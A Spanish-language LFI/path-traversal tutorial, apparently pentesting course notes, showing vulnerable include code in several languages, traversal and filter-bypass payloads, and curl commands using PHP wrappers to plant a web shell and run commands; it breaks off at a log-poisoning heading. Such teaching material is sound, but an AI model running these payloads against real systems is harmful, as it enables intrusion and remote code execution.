
Para detectar este tipo de vulnerabilidades debemos buscar la forma de cargar archivos del servidor cuando no debería poderse. Podemos detectarlo con un análisis estático, así sería la vulnerabilidad en algunos lenguajes de programación.

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
Incluye en la ruta cualquier archivo que le introduzcamos en languaje sin revisarlo.

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
Utiliza la función readFile, independientemente del archivo que sea.

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
Renderiza  la ruta especificada siendo cualquier archivo.

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```
En java también pueden usar la función include que es igual que en PHP.

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```
La función import funciona igual, por lo que se puede aprovechar para explotar la vulnerabilidad.

Podemos ver si podemos explotar la vulnerabilidad según las funciones que usan en la siguiente tabla:

| **Función** | **Leer contenido** | **Ejecutar** | **URL remota** |
| ---- | :--: | :--: | :--: |
| **PHP** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodoJS** |  |  |  |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NETO** |  |  |  |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` |  |  |  |

Cuando las funciones especifican que los archivos son del directorio actual, como por ejemplo:
```php
include("./languages/" . $_GET['language']);
```
Se convierte en una vulnerabilidad de Path Transversal dónde hay que retroceder directorios y movernos a ciegas por el sistema de ficheros hasta llegar a dónde queremos. En lugar de añadir /etc/passwd en el campo vulnerable tendríamos que añadir suficientes ../ como directorios haya y luego poner la ruta a la que queremos llegar: ../../../../../../etc/passwd

Cuando se añade un prefijo al nombre el payload tendría que empezar por /.

### Basic Bypasses

#### ../ filter

Una técnica para evitar esta vulnerabilidad sería reemplazar los ../ por caracteres en blanco para que no se pudiera retroceder en los directorios. Para saltar esto podemos incluir en lugar de ../ ....// para que cuando quiten el ../ se quede de nuevo ../.

También se puede codificar en hexadecimal ya que la web también lo entiende. En el formato %num%num%num. Es posible usar `..%c0%af` y `..%ef%bc%8f` como encoding.

#### Route filter

Otras páginas pueden tener un filtro para que solo se puedan extraer archivos de la ruta especificada. Por ello tenemos que añadir esa ruta a nuestros payload:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

./languaje/../../../../../etc/passwd

#### Extensión adjunta

En la versiones de PHP anteriores a la `5.3/5.4` se utilizaba el truncamiento de ruta, si la ruta superaba los 4096 caracteres se truncaba la ruta así que se eliminaría la extensión .php. Además, el . en medio de la ruta se elimina.
```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Las versiones anteriores a la 5.5 de PHP son vulnerable al byte nulo, si al final de la ruta se añade %00 todo lo que vaya después se elimina.

### PHP wrappers

Una forma de exfiltrar código cuando se añade la extensión al final de los archivos que se buscan es con wrappers.

#### Data

Para poder utilizar esto debemos ver si hay una opción activada mirando en el archivo de configuración:

```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Tiene que existir esta línea de esta forma:

```shell-session
allow_url_include = On
```

Primero convertimos el payload a base64
```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

De esta forma tenemos una shell dinámica con la que podemos ejecutar comandos con la ruta vulnerable.

```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

#### Input

El input necesita que el parámetro vulnerable permita peticiones POST para poderse llevar a cabo.

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

#### Expect

Esto solo funcionará si está instalado en el servidor back-end, podemos comprobarlo mirando en el archivo de configuración si tiene la siguiente linea:

```shell-session
extension=expect
```

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

Expect directamente evalúa código, por lo que no hará falta crear ninguna shell.

### Log poisoning

Consiste en contaminar el archivo de log con código que se pueda ejecutar. Las funciones que pueden ser vulnerables son las siguientes:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

#### PHP session poisoning

Existe una cookie muy utilizada llamada PHPSESSID, esta se almacena en el servidor víctima en el PATH `/var/lib/php/sessions/` en linux y `C:\Windows\Temp\` en Windows.

El archivo es almacenado con el nombre de la cookie y el prefijo sess.

#### Server Log Poisoning

